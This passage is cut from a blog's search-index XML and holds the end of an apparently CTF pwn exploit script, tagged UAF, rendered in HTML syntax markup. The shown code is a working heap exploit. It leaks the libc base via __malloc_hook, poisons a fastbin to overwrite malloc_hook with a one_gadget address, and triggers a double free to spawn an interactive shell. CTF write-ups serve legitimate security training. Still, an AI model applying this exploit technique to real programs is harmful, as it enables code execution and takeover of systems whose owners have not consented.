class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>li<span class="token punctuation">(</span><span class="token string">'libc_base = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x13</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
